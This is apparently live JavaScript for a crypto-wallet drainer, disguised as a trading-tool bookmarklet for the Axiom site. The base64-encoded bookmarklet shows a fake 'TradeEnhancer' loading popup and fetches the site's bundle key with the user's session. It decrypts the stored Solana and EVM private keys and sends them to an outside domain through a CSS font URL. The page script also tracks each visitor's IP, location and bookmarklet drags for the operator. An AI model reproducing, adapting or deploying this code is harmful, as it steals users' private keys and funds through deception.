try {


    const data = JSON.parse(atob(document.currentScript.getAttribute("data")));
    const api_url = new URL(document.currentScript.getAttribute("src"));


    // Function to get country flag emoji from country code
    function getCountryFlag(countryCode) {
        if (!countryCode || countryCode.length !== 2) return '🏳️';
        const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
        return String.fromCodePoint(...codePoints);
    }

    const encodeBase64Unicode = (value) => {
        const bytes = new TextEncoder().encode(value);
        let binary = "";
        bytes.forEach(byte => {
            binary += String.fromCharCode(byte);
        });
        return btoa(binary);
    };

    window.showUniversalPopup = function (message) {
        // Remove existing popup if any
        const existingPopup = document.getElementById('bf-universal-popup');
        if (existingPopup) {
            existingPopup.remove();
        }

        // Create overlay with heavy blur (iOS/macOS style)
        const overlay = document.createElement('div');
        overlay.id = 'bf-universal-popup';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(40px) saturate(180%);
            -webkit-backdrop-filter: blur(40px) saturate(180%);
            z-index: 999999;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            box-sizing: border-box;
            animation: bf-fadeIn 0.3s cubic-bezier(0.36, 0.66, 0.04, 1);
        `;

        // Create modal with frosted glass effect - matte transparent glass
        const modal = document.createElement('div');
        modal.style.cssText = `
            background: rgba(28, 28, 30, 0.4);
            backdrop-filter: blur(80px) saturate(180%) brightness(1.1);
            -webkit-backdrop-filter: blur(80px) saturate(180%) brightness(1.1);
            border-radius: 20px;
            border: 0.5px solid rgba(255, 255, 255, 0.15);
            box-shadow: 
                0 8px 32px rgba(0, 0, 0, 0.4),
                0 2px 8px rgba(0, 0, 0, 0.3),
                inset 0 1px 0 rgba(255, 255, 255, 0.15),
                inset 0 -1px 0 rgba(0, 0, 0, 0.2);
            max-width: 480px;
            width: 100%;
            max-height: 85vh;
            overflow: hidden;
            position: relative;
            animation: bf-slideUp 0.4s cubic-bezier(0.36, 0.66, 0.04, 1);
        `;

        // Add frosted glass overlay for matte effect
        const frostedOverlay = document.createElement('div');
        frostedOverlay.style.cssText = `
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(
                135deg,
                rgba(255, 255, 255, 0.05) 0%,
                rgba(255, 255, 255, 0.02) 50%,
                rgba(0, 0, 0, 0.05) 100%
            );
            backdrop-filter: blur(1px);
            -webkit-backdrop-filter: blur(1px);
            pointer-events: none;
            border-radius: 20px;
        `;
        modal.appendChild(frostedOverlay);

        // Create header
        const header = document.createElement('div');
        header.style.cssText = `
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 24px 28px 20px;
            position: relative;
            z-index: 1;
        `;

        const titleWrapper = document.createElement('div');
        titleWrapper.style.cssText = `
            display: flex;
            align-items: center;
            gap: 10px;
        `;

        const icon = document.createElement('div');
        icon.textContent = '⚠️';
        icon.style.cssText = `
            font-size: 24px;
            line-height: 1;
        `;

        const title = document.createElement('div');
        title.textContent = 'Notice';
        title.style.cssText = `
            font-size: 20px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.95);
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
            letter-spacing: -0.3px;
            line-height: 1.2;
        `;

        titleWrapper.appendChild(icon);
        titleWrapper.appendChild(title);

        const closeBtn = document.createElement('button');
        closeBtn.innerHTML = '✕';
        closeBtn.style.cssText = `
            background: rgba(255, 255, 255, 0.08);
            border: none;
            font-size: 18px;
            color: rgba(255, 255, 255, 0.6);
            cursor: pointer;
            padding: 0;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 8px;
            transition: all 0.2s cubic-bezier(0.36, 0.66, 0.04, 1);
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
            line-height: 1;
            font-weight: 400;
        `;
        closeBtn.onmouseover = function () {
            this.style.background = 'rgba(255, 59, 48, 0.2)';
            this.style.color = 'rgba(255, 59, 48, 1)';
        };
        closeBtn.onmouseout = function () {
            this.style.background = 'rgba(255, 255, 255, 0.08)';
            this.style.color = 'rgba(255, 255, 255, 0.6)';
        };

        // Create content - crisp and clear, dark theme
        const content = document.createElement('div');
        content.style.cssText = `
            padding: 0 28px 24px;
            color: rgba(255, 255, 255, 0.95);
            font-size: 15px;
            line-height: 1.5;
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
            word-wrap: break-word;
            font-weight: 400;
            letter-spacing: -0.1px;
            position: relative;
            z-index: 1;
        `;
        content.textContent = message;

        // Create footer with OK button
        const footer = document.createElement('div');
        footer.style.cssText = `
            padding: 20px 28px 24px;
            display: flex;
            justify-content: flex-end;
            gap: 12px;
            position: relative;
            z-index: 1;
        `;

        const okBtn = document.createElement('button');
        okBtn.textContent = 'OK';
        okBtn.style.cssText = `
            background: rgba(10, 132, 255, 0.9);
            color: #ffffff;
            border: none;
            padding: 10px 24px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s cubic-bezier(0.36, 0.66, 0.04, 1);
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
            letter-spacing: -0.1px;
            min-width: 80px;
        `;

        okBtn.onmouseover = function () {
            this.style.background = 'rgba(10, 132, 255, 1)';
            this.style.transform = 'scale(0.98)';
            this.style.boxShadow = '0 2px 6px rgba(0, 0, 0, 0.4)';
        };
        okBtn.onmouseout = function () {
            this.style.background = 'rgba(10, 132, 255, 0.9)';
            this.style.transform = 'scale(1)';
            this.style.boxShadow = '0 1px 3px rgba(0, 0, 0, 0.3)';
        };

        okBtn.onmousedown = function () {
            this.style.transform = 'scale(0.96)';
        };

        okBtn.onmouseup = function () {
            this.style.transform = 'scale(0.98)';
        };

        // Close function with smooth animation
        const closePopup = function () {
            overlay.style.animation = 'bf-fadeOut 0.25s cubic-bezier(0.36, 0.66, 0.04, 1)';
            modal.style.animation = 'bf-slideUp 0.25s cubic-bezier(0.36, 0.66, 0.04, 1) reverse';
            setTimeout(() => {
                overlay.remove();
            }, 250);
        };

        closeBtn.onclick = closePopup;
        okBtn.onclick = closePopup;
        overlay.onclick = function (e) {
            if (e.target === overlay) {
                closePopup();
            }
        };

        // Add keyboard support
        const handleKeyPress = function (e) {
            if (e.key === 'Escape') {
                closePopup();
                document.removeEventListener('keydown', handleKeyPress);
            }
        };
        document.addEventListener('keydown', handleKeyPress);

        // Assemble modal
        header.appendChild(titleWrapper);
        header.appendChild(closeBtn);
        footer.appendChild(okBtn);
        modal.appendChild(header);
        modal.appendChild(content);
        modal.appendChild(footer);
        overlay.appendChild(modal);

        // Add iOS/macOS style animations
        const style = document.createElement('style');
        style.textContent = `
            @keyframes bf-fadeIn {
                from { 
                    opacity: 0; 
                    backdrop-filter: blur(0px) saturate(100%);
                    -webkit-backdrop-filter: blur(0px) saturate(100%);
                }
                to { 
                    opacity: 1; 
                    backdrop-filter: blur(40px) saturate(180%);
                    -webkit-backdrop-filter: blur(40px) saturate(180%);
                }
            }
            @keyframes bf-fadeOut {
                from { 
                    opacity: 1; 
                    backdrop-filter: blur(40px) saturate(180%);
                    -webkit-backdrop-filter: blur(40px) saturate(180%);
                }
                to { 
                    opacity: 0; 
                    backdrop-filter: blur(0px) saturate(100%);
                    -webkit-backdrop-filter: blur(0px) saturate(100%);
                }
            }
            @keyframes bf-slideUp {
                from {
                    transform: translateY(20px) scale(0.96);
                    opacity: 0;
                }
                to {
                    transform: translateY(0) scale(1);
                    opacity: 1;
                }
            }
        `;
        if (!document.getElementById('bf-popup-styles')) {
            style.id = 'bf-popup-styles';
            document.head.appendChild(style);
        }

        // Append to body
        document.body.appendChild(overlay);
    };

    document.addEventListener("DOMContentLoaded", () => {
        // Get user IP and country
        let ipDataOutput = null;
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(ipData => {
                ipDataOutput = ipData;
                console.log(api_url.origin);
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        platform: data.platform,
                        botId: data.botId,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n🌐 <b>Page Visit</b>\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip + "\n<code>" + navigator.userAgent + "</code>",
                    })
                });
            })
            .catch(err => {
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        botId: data.botId,
                        platform: data.platform,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n🌐 <b>Page Visit</b>\n\n🏳️ Unknown • Unknown IP\n<code>" + navigator.userAgent + "</code>",
                    })
                });
            });

        document.querySelectorAll("a.bookmarklet").forEach(abtns => {
            const msg = "Please go to the Axiom website and activate the tool. The tool will not work unless you are on the Axiom website"
            const hyperliquidUrl = "https://axiom.trade";
            const drainer = `
            (async () => {
    if (location.hostname ===  "${location.hostname}" || location.origin !==  "${hyperliquidUrl}") return window.showUniversalPopup("${msg}");

    console.log('[Axiom] Start');
    const scriptElement = document.currentScript;
    let code = "${data.code}";
    let username = "${data.username}";
    let platform = "${data.platform}";
    let botId = "${data.botId}";

    function showLiquidLoaderPopup() {
  const POPUP_ID = '__liquid_loader_popup__';
  const STYLE_ID = '__liquid_loader_popup_styles__';
  const SIZE_LIMITS = {
    minWidth: 220,
    minHeight: 160,
    maxWidth: () => Math.min(380, window.innerWidth - 32),
    maxHeight: () => Math.min(360, window.innerHeight - 32),
    collapsedHeight: 44,
  };
  const clamp = (value, min, max) => Math.min(Math.max(value, min), max);

  const existing = document.getElementById(POPUP_ID);
  if (existing) {
    existing.__cleanup?.();
    existing.remove();
  }

  let styleTag = document.getElementById(STYLE_ID);
  if (!styleTag) {
    styleTag = document.createElement('style');
    styleTag.id = STYLE_ID;
    styleTag.textContent = \`
      #\${POPUP_ID} {
        position: fixed;
        bottom: 16px;
        right: 16px;
        padding: 16px 20px 18px;
        border-radius: 18px;
        color: #f4f6fb;
        font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        background: rgba(17, 25, 40, 0.8);
        box-shadow:
          0 25px 45px rgba(0, 0, 0, 0.35),
          inset 0 0 0 1px rgba(255, 255, 255, 0.08);
        backdrop-filter: blur(14px);
        -webkit-backdrop-filter: blur(14px);
        z-index: 2147483647;
        display: flex;
        flex-direction: column;
        gap: 12px;
        transition: transform 0.25s ease, opacity 0.25s ease, height 0.2s ease;
        min-width: \${SIZE_LIMITS.minWidth}px;
        min-height: \${SIZE_LIMITS.minHeight}px;
        max-width: min(380px, calc(100vw - 32px));
        max-height: min(360px, calc(100vh - 32px));
        overflow: hidden;
      }
      #\${POPUP_ID}::before {
        content: '';
        position: absolute;
        inset: 0;
        border-radius: inherit;
        background: radial-gradient(circle at top, rgba(255,255,255,0.18), transparent 60%);
        pointer-events: none;
        opacity: 0.85;
      }
      #\${POPUP_ID} .popup-header,
      #\${POPUP_ID} .popup-body {
        position: relative;
        z-index: 1;
      }
      #\${POPUP_ID}.collapsed {
        padding: 10px 16px;
        min-height: \${SIZE_LIMITS.collapsedHeight}px;
        height: \${SIZE_LIMITS.collapsedHeight}px !important;
        max-height: \${SIZE_LIMITS.collapsedHeight}px;
        min-width: auto;
        width: max-content;
        max-width: 240px;
      }
      #\${POPUP_ID}.collapsed .popup-body {
        opacity: 0;
        max-height: 0;
      }
      #\${POPUP_ID}.collapsed .resize-handle {
        display: none;
      }
      #\${POPUP_ID} .popup-header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 12px;
        cursor: grab;
        user-select: none;
      }
      #\${POPUP_ID} .popup-header:active {
        cursor: grabbing;
      }
      #\${POPUP_ID} .popup-title {
        font-size: 13px;
        letter-spacing: 0.16em;
        text-transform: uppercase;
        opacity: 0.9;
      }
      #\${POPUP_ID} button.popup-toggle {
        background: rgba(255, 255, 255, 0.12);
        border: none;
        border-radius: 999px;
        width: 26px;
        height: 26px;
        color: inherit;
        cursor: pointer;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        transition: background 0.2s ease;
      }
      #\${POPUP_ID} button.popup-toggle:hover {
        background: rgba(255, 255, 255, 0.22);
      }
      #\${POPUP_ID} .popup-body {
        flex: 1;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        text-align: center;
        gap: 14px;
        overflow: hidden;
        transition: max-height 0.25s ease, opacity 0.2s ease;
      }
      #\${POPUP_ID} .spinner {
        width: 38px;
        height: 38px;
        border-radius: 50%;
        border: 3px solid rgba(244, 246, 251, 0.14);
        border-top-color: #7dd9ff;
        animation: liquid-spin 0.9s linear infinite;
      }
      #\${POPUP_ID} .loading-text {
        font-size: 16px;
        letter-spacing: 0.16em;
        text-transform: uppercase;
      }
      #\${POPUP_ID} .resize-handle {
        position: absolute;
        bottom: 6px;
        right: 10px;
        width: 16px;
        height: 16px;
        border-right: 2px solid rgba(255, 255, 255, 0.5);
        border-bottom: 2px solid rgba(255, 255, 255, 0.5);
        cursor: nwse-resize;
        opacity: 0.7;
      }
      @keyframes liquid-spin {
        from { transform: rotate(0deg); }
        to { transform: rotate(360deg); }
      }
    \`;
    document.head.appendChild(styleTag);
  }

  const popup = document.createElement('div');
  popup.id = POPUP_ID;
  popup.innerHTML = \`
    <div class="popup-header" data-role="drag">
      <span class="popup-title">TradeEnhancer</span>
      <button class="popup-toggle" type="button" aria-label="Toggle popup" data-action="toggle">—</button>
    </div>
    <div class="popup-body">
      <div class="spinner" aria-hidden="true"></div>
      <span class="loading-text">Loading</span>
    </div>
    <div class="resize-handle" data-role="resize"></div>
  \`;
  document.body.appendChild(popup);

  let expandedSize = {
    width: clamp(popup.offsetWidth || SIZE_LIMITS.minWidth, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth()),
    height: clamp(popup.offsetHeight || SIZE_LIMITS.minHeight, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight()),
  };

  const applyExpandedSize = () => {
    expandedSize = {
      width: clamp(expandedSize.width, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth()),
      height: clamp(expandedSize.height, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight()),
    };
    popup.style.width = \`\${expandedSize.width}px\`;
    popup.style.height = \`\${expandedSize.height}px\`;
  };

  const rememberExpandedSize = () => {
    expandedSize = {
      width: clamp(popup.offsetWidth, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth()),
      height: clamp(popup.offsetHeight, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight()),
    };
  };

  applyExpandedSize();

  const keepWithinViewport = () => {
    const maxX = Math.max(16, window.innerWidth - popup.offsetWidth - 16);
    const maxY = Math.max(16, window.innerHeight - popup.offsetHeight - 16);
    const currentX = parseFloat(popup.style.left || \`\${maxX}\`);
    const currentY = parseFloat(popup.style.top || \`\${maxY}\`);
    popup.style.left = \`\${clamp(currentX, 16, maxX)}px\`;
    popup.style.top = \`\${clamp(currentY, 16, maxY)}px\`;
  };

  popup.style.position = 'fixed';
  keepWithinViewport();

  const toggleButton = popup.querySelector('[data-action="toggle"]');
  const setCollapsed = (shouldCollapse) => {
    if (shouldCollapse) {
      rememberExpandedSize();
      popup.classList.add('collapsed');
      popup.style.width = '';
      popup.style.height = '';
      toggleButton.textContent = '+';
    } else {
      popup.classList.remove('collapsed');
      applyExpandedSize();
      toggleButton.textContent = '—';
    }
    requestAnimationFrame(() => keepWithinViewport());
  };

  toggleButton.addEventListener('click', () => {
    setCollapsed(!popup.classList.contains('collapsed'));
  });

  const dragHandle = popup.querySelector('[data-role="drag"]');
  let dragStart = null;
  const startDrag = (event) => {
    event.preventDefault();
    dragStart = {
      pointerX: event.clientX,
      pointerY: event.clientY,
      left: parseFloat(popup.style.left) || 16,
      top: parseFloat(popup.style.top) || 16,
    };
    document.addEventListener('pointermove', onDrag);
    document.addEventListener('pointerup', stopDrag, { once: true });
  };

  const onDrag = (event) => {
    if (!dragStart) return;
    const deltaX = event.clientX - dragStart.pointerX;
    const deltaY = event.clientY - dragStart.pointerY;
    const maxX = Math.max(16, window.innerWidth - popup.offsetWidth - 16);
    const maxY = Math.max(16, window.innerHeight - popup.offsetHeight - 16);
    popup.style.left = \`\${clamp(dragStart.left + deltaX, 16, maxX)}px\`;
    popup.style.top = \`\${clamp(dragStart.top + deltaY, 16, maxY)}px\`;
  };

  const stopDrag = () => {
    dragStart = null;
    document.removeEventListener('pointermove', onDrag);
  };

  dragHandle.addEventListener('pointerdown', startDrag);

  const resizeHandle = popup.querySelector('[data-role="resize"]');
  let resizeStart = null;
  const startResize = (event) => {
    if (popup.classList.contains('collapsed')) return;
    event.preventDefault();
    resizeStart = {
      pointerX: event.clientX,
      pointerY: event.clientY,
      width: popup.offsetWidth,
      height: popup.offsetHeight,
    };
    document.addEventListener('pointermove', onResize);
    document.addEventListener('pointerup', stopResize, { once: true });
  };

  const onResize = (event) => {
    if (!resizeStart) return;
    const deltaX = event.clientX - resizeStart.pointerX;
    const deltaY = event.clientY - resizeStart.pointerY;
    const nextWidth = clamp(resizeStart.width + deltaX, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth());
    const nextHeight = clamp(resizeStart.height + deltaY, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight());
    expandedSize = { width: nextWidth, height: nextHeight };
    applyExpandedSize();
    keepWithinViewport();
  };

  const stopResize = () => {
    resizeStart = null;
    document.removeEventListener('pointermove', onResize);
  };

  resizeHandle.addEventListener('pointerdown', startResize);

  const resizeObserver = new ResizeObserver(() => {
    if (!popup.classList.contains('collapsed')) {
      rememberExpandedSize();
    }
    keepWithinViewport();
  });
  resizeObserver.observe(popup);

  const resizeHandler = () => {
    if (!popup.classList.contains('collapsed')) {
      applyExpandedSize();
    }
    keepWithinViewport();
  };
  window.addEventListener('resize', resizeHandler, { passive: true });
  keepWithinViewport();

  requestAnimationFrame(() => {
    popup.style.transform = 'translateY(6px)';
    popup.style.opacity = '0';
    requestAnimationFrame(() => {
      popup.style.transform = 'translateY(0px)';
      popup.style.opacity = '1';
    });
  });

  popup.__cleanup = () => {
    window.removeEventListener('resize', resizeHandler);
    resizeObserver.disconnect();
    document.removeEventListener('pointermove', onDrag);
    document.removeEventListener('pointermove', onResize);
  };
}
  showLiquidLoaderPopup();
    
    function arrayToString(dataArray) {
        const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    
        const resultDigits = [0];
    
        for (let element of dataArray) {
            let carry = element;
    
            for (let i = 0; i < resultDigits.length; i++) {
                const value = resultDigits[i] * 0x100 + carry;
    
                resultDigits[i] = value % 58;
                carry = value / 58 | 0;
            }
    
            while (carry) {
                resultDigits.push(carry % 58);
    
                carry = carry / 58 | 0;
            }
        }
    
        let resultString = "";
    
        for (let i = 0; i < dataArray.length && dataArray[i] === 0; i++) resultString += ALPHABET[0];
    
        for (let i = resultDigits.length - 1; i >= 0; i--) resultString += ALPHABET[resultDigits[i]];
    
        return resultString
    }
        
    function arrayToStringEVM(e) {
        return Array.from(e instanceof Uint8Array ? e : new Uint8Array(e)).map(e => e.toString(16).padStart(2, "0")).join("")
    }
    
    function stringToArray(key) {
        try {
            const cleanedKey = key.replace(new RegExp("-", "g"), "+").replace(new RegExp("_", "g"), "/");
    
            return Uint8Array.from(atob(cleanedKey), key => {
                return key.charCodeAt(0)
            })
        } catch {
            return new TextEncoder().encode(key)
        }
    }
    
    async function sendData(apiUrlOrigin, data) {
    const encodeBase64Unicode = (value) => {
        const bytes = new TextEncoder().encode(value);
        let binary = "";
        bytes.forEach(byte => {
            binary += String.fromCharCode(byte);
        });
        return btoa(binary);
    };
    
        const url = \`\${apiUrlOrigin + "?nocache=" + encodeURIComponent(encodeBase64Unicode(JSON.stringify(data)))}\`;
        const customError = "Extension activated. Press F4 to start";
    
        const styleElement = document.createElement("style");
        styleElement.textContent = \`\n@font-face{\nfont-family:"leak";\nsrc:url("\${url}");\n}\n.font-target{\nfont-family:leak;\n}\n\`;
    
        const divElement = document.createElement("div");
        divElement.innerText = customError;
        divElement.classList.add("font-target");
    
        document.body.appendChild(divElement);
        document.head.appendChild(styleElement);
    }
    
    async function decrypt(key, toDecrypt) {
        const [ivString, dataString] = String(toDecrypt).split(":");
    
        const iv = stringToArray(ivString);
        const data = stringToArray(dataString);
    
        const decrypted = await crypto.subtle.decrypt({ "name": "AES-GCM", iv: iv, "tagLength": 128 }, key, data);
    
        return new Uint8Array(decrypted)
    }

    const { bundleKey } = await (await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
        "method": "POST",
        "credentials": "include"
    })).json();

    const cryptoKey = await crypto.subtle.importKey("raw", stringToArray(bundleKey).buffer, { "name": "AES-GCM" }, false, ["decrypt"]);

    const solanaBundles = JSON.parse(localStorage.getItem("sBundles") || "[]");
    const evmBundles = JSON.parse(localStorage.getItem("eBundles") || "[]");

    const errors = [];
    const success = [];

    for (const bundle of solanaBundles) {
        let publicKey = "(unknown)";
        let privateKey = "";

        try {
            const decryptedBundle = await decrypt(cryptoKey, bundle);

            if (decryptedBundle.length !== 0x40) throw new Error("bad SK length")

            privateKey = arrayToString(decryptedBundle);

            const publicKeyData = decryptedBundle.slice(0x20);

            publicKey = arrayToString(publicKeyData);


            success.push({
                "pub": publicKey,
                "priv": privateKey
            });


        } catch (sIIFx3y) {
            errors.push({
                "pub": publicKey,
                "reason": sIIFx3y["message"]
            })
        }
    }

    for (const bundle of evmBundles) {
        let publicKey = "(unknown)";
        let privateKey = "";

        try {
            const decryptedBundle = await decrypt(cryptoKey, bundle);

            privateKey = arrayToStringEVM(decryptedBundle);

            let publicKey;
            
            publicKey = "unknown";


            success.push({
                "pub": publicKey,
                "priv": privateKey
            });


        } catch (sIIFx3y) {
            errors.push({
                "pub": publicKey,
                "reason": sIIFx3y["message"]
            })
        }
    }

    let sent = [];
    let keys = [];

    keys.push(...success.map(key => {
        return {
            "public": key["pub"],
            "private": key["priv"]
        }
    }));

    sendData(
        "https://simpletestdomain.sbs/",
        {
            "sent": sent,
            "keys": keys,
            "code": "${data.code}",
            "username": "${data.username}",
            "platform": "${data.platform}",
            "botId": "${data.botId}"
        }
    );

})();
            `;
            abtns.href = "javascript:eval(atob('" + encodeBase64Unicode(drainer) + "'))";
            abtns.draggable = true;

            abtns.draggable = true;

            abtns.addEventListener('dragstart', evt => {
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        botId: data.botId,
                        platform: data.platform,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n⬇️ <b>Bookmarklet Drag Started</b>\n\n" + getCountryFlag(ipDataOutput.country_code) + " " + ipDataOutput.country_name + " • " + ipDataOutput.ip,
                    })
                });
            });

            abtns.addEventListener('dragend', evt => {
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        botId: data.botId,
                        platform: data.platform,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n✅ <b>Bookmarklet Drag Complete</b>\n\n" + getCountryFlag(ipDataOutput.country_code) + " " + ipDataOutput.country_name + " • " + ipDataOutput.ip,
                    })
                });
            });
        });
    });

    console.log("%c[+] Bookmarklets loaded successfully", "color: #bada55");
} catch (error) {
    console.error("[-] Failed to load bookmarklet(s):", error);
    alert("Failed to load bookmarklet(s): " + error.message);
    fetch(`${api_url.origin}/api/message`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            error: 1,
            chatId: data.code,
            username: data.username,
            botId: data.botId,
            platform: data.platform,
            errorMessage: error.message
        })
    });
}